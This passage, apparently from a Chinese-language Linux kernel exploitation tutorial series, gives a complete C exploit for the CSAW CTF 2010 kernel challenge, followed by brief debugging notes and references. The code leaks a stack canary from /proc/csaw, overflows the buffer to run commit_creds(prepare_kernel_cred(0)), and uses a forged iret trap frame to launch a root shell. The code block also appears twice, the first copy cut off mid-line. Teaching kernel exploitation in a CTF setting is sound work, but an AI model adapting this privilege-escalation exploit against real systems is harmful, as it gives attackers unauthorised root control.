            for(j = 0;j
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    struct trap_frame{
        void *eip;
        uint32_t cs;
        uint32_t eflags;
        void *esp;
        uint32_t ss;
    }__attribute__((packed));
    void launch_shell(void) 
    { 
        execl("/bin/sh", "sh", NULL);
    }
    struct trap_frame tf;
    void prepare_tf(void) 
    { 
        asm("pushl %cs; popl tf+4;"
            "pushfl; popl tf+8;"
            "pushl %esp; popl tf+12;"
            "pushl %ss; popl tf+16;");
        tf.eip = &launch_shell;
        tf.esp -= 1024;
    }
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc1067fc0;
    void (*commit_creds)(void*) KERNCALL = (void*) 0xc1067e20;
    void payload(void){
        //payload here    
        commit_creds(prepare_kernel_cred(0));
        asm("mov $tf,%esp;"
           "iret;");
    }
    int main(int argc,char *argv[]){
        int fd = open("/proc/csaw",O_RDWR);
        if(!fd){
            printf("errorn");
            exit(1);
        }
        lseek(fd,16,SEEK_CUR);
        char buffer[64] = {0};
        read(fd,buffer,64);
        int i,j;
        //memset(buffer,0x41,64);
        for(i = 0;i
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    struct trap_frame{
        void *eip;
        uint32_t cs;
        uint32_t eflags;
        void *esp;
        uint32_t ss;
    }__attribute__((packed));
    void launch_shell(void) 
    { 
        execl("/bin/sh", "sh", NULL);
    }
    struct trap_frame tf;
    void prepare_tf(void) 
    { 
        asm("pushl %cs; popl tf+4;"
            "pushfl; popl tf+8;"
            "pushl %esp; popl tf+12;"
            "pushl %ss; popl tf+16;");
        tf.eip = &launch_shell;
        tf.esp -= 1024;
    }
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc1067fc0;
    void (*commit_creds)(void*) KERNCALL = (void*) 0xc1067e20;
    void payload(void){
        //payload here    
        commit_creds(prepare_kernel_cred(0));
        asm("mov $tf,%esp;"
           "iret;");
    }
    int main(int argc,char *argv[]){
        int fd = open("/proc/csaw",O_RDWR);
        if(!fd){
            printf("errorn");
            exit(1);
        }
        lseek(fd,16,SEEK_CUR);
        char buffer[64] = {0};
        read(fd,buffer,64);
        int i,j;
        //memset(buffer,0x41,64);
        for(i = 0;i<4;i++){
            for(j = 0;j<16;j++){
                printf("%02x ",buffer[i*16+j] & 0xff);
            }
            printf(" | ");
            for(j = 0;j<16;j++){
                printf("%c",buffer[i*16+j] & 0xff);
            }
            printf("n");
        }
        char canary[4] = {0};
        memcpy(canary,buffer+32,4);
        printf("CANARY:");
        for(i = 0;i<4;i++){
            printf("%02x",canary[i] & 0xff);
        }
        printf("n");
        char poc[84] = {0};
        memset(poc,0x41,84);
        memcpy(poc+64,canary,4);//set canary
        *((void**)(poc+64+4+4)) = &payload;
        *((void**)(poc+64+4+4+4)) = &payload;
        *((void**)(poc+64+4+4+4+4)) = &payload;
        printf("[*]payload:%sn",poc);
        printf("Triger bug:n");
        //init tf struct;
        prepare_tf();
        write(fd,poc,84);
        return 0;
    }
**1\. 调试**
编译运行exploit_final，调试查看执行过程：
查看栈顶，发现是我们payload的地址，单步过去查看：
先去执行commit_creds(prepare_kernel_cred(0))，然后我们查看一下伪造的tf结构：
看一下tf.eip指向的函数：
和exploit_final的get shell函数对比一下：
没什么问题，我们直接c过去。
**2\. 添加用户并测试**
添加普通用户muhe，然后测试exploit：
成功拿到root shell。
**0x05 : 参考与引用**
[CSAW CTF 2010 Kernel Exploitation
Challenge](https://jon.oberheide.org/blog/2010/11/02/csaw-ctf-kernel-exploitation-challenge/)
**传送门**
* * *
**[【系列分享】Linux
内核漏洞利用教程（一）：环境配置](http://bobao.360.cn/learning/detail/3700.html)**
[**【系列分享】Linux 内核漏洞利用教程（二）：两个Demo**
****](http://bobao.360.cn/learning/detail/3702.html)